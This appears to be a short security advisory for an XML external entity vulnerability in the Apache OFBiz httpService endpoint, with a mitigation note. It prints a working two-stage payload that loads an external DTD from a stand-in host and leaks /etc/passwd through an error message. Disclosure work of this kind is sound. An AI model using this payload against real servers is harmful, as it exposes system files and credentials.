Both POST and GET requests to the httpService endpoint may contain three parameters: serviceName, serviceMode, and serviceContext. The exploitation occurs by having DOCTYPEs pointing to external references that trigger a payload that returns secret information from the host.  Mitigation: Upgrade to or manually apply the following commits on branch 16  Example: # The following payload may be used: <?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY % request SYSTEM 'http://example.com/evil.xml'> %request; %secondstage; ]> <r>&disclose;</r>  # And then the remote file evil.xml has the following payload: <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % secondstage "<!ENTITY disclose SYSTEM 'file:///nonexistent/%file;'>"> %secondstage; %disclose;  The second stage payload specifies what file to disclose on the OFBiz server. It instructs the OFBiz server to look for a file in the path /nonexistent/. The server will throw a "File Not Found" error and then append the target file (/etc/passwd) to the error message.
